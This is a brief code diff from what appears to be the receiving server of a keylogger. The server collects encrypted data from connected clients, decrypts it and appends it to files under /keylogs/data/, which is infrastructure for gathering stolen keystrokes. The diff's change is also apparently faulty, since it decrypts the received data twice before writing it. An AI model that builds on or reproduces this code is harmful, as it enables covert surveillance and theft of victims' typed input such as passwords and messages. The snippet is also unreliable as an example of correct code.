@@ -172,8 +172,9 @@ def receiver(port):
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
-            data = f.write(dechiffrement(data))
+            data = dechiffrement(data)
             if data != "":
+                f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
                 buffer_time = 0;
